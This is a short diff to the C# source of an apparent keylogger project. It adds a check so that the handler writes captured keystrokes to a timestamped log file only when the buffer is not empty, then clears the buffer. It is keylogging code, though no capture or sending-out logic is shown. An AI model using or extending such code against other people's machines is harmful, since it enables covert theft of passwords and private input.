@@ -38,11 +38,14 @@ namespace Rodjenihm.Zlogger
         {
             var keylogger = sender as Keylogger;
 
-            var logName = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt";
-            var logPath = Path.Combine(keylogger.LogDir, logName);
-            File.WriteAllText(logPath, keylogger.Buffer.ToString());
+            if (keylogger.Buffer.Length > 0)
+            {
+                var logName = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt";
+                var logPath = Path.Combine(keylogger.LogDir, logName);
+                File.WriteAllText(logPath, keylogger.Buffer.ToString());
 
-            keylogger.Buffer.Clear();
+                keylogger.Buffer.Clear();
+            }
         }
     }
 }
